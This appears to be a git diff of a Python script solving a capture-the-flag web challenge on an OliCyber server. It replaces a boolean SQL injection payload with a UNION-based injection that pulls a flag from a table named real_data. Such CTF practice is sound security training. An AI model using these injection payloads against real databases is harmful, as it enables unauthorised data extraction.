@@ -1,6 +1,4 @@
 import requests
-import binascii
-import time
 
 
 class Inj:
@@ -39,7 +37,7 @@ class Inj:
         response = self._do_raw_req(url, query)
         return response['result'], response['sql_error']
 
-
-inj = Inj("http://web-17.challs.olicyber.it")
-response, error = inj.logic("'or 1 = 1 or '")
+inj = Inj('http://web-17.challs.olicyber.it')
+response, error = inj.union("1' or '1 = 1' union select flag,2,3,4,5,6 from real_data where '1= 1")
 print(response)
+
